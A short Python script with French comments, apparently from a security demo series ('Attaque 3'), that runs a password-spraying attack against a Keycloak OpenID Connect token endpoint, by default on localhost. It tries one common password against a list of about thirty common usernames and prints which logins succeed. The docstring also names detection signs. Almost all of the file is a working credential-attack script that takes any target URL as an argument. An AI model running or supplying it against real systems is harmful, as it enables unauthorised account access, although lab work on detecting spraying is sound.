"""
Attaque 3 : PASSWORD SPRAYING
==============================
Inverse du brute force : on essaie 1 mot de passe très commun
sur PLEIN d'utilisateurs. Évite le verrouillage par compte.

Détectable par :
  - même IP -> beaucoup d'usernames différents
  - faible nombre de tentatives par username (1 ou 2)
"""
import sys, time, requests

KEYCLOAK_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
COMMON_PWD   = sys.argv[2] if len(sys.argv) > 2 else "Password123!"

REALM         = "sso-demo"
CLIENT_ID     = "ticket-app"
CLIENT_SECRET = "ticket-app-secret"

# Liste type "OSINT" : prénoms communs
USERNAMES = [
    "admin", "administrator", "root", "test", "guest", "user", "demo",
    "alice", "bob", "charlie", "david", "eve", "frank", "grace",
    "henry", "ivy", "jack", "kate", "leo", "mia", "noah", "olivia",
    "peter", "queen", "rachel", "sam", "tom", "uma", "victor", "wendy",
]


def try_login(username, password):
    url = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/token"
    data = {
        "grant_type":   "password",
        "client_id":    CLIENT_ID,
        "client_secret":CLIENT_SECRET,
        "username":     username,
        "password":     password,
    }
    try:
        r = requests.post(url, data=data, timeout=5)
        return r.status_code == 200
    except Exception:
        return False


print(f"[*] Password spraying avec '{COMMON_PWD}'")
print(f"[*] {len(USERNAMES)} usernames testés\n")

for i, u in enumerate(USERNAMES, 1):
    ok = try_login(u, COMMON_PWD)
    print(f"  [{i:3d}/{len(USERNAMES)}] {u:15s} -> {'✓ TROUVÉ' if ok else '✗'}")
    time.sleep(0.3)

print("\n[*] Terminé.")
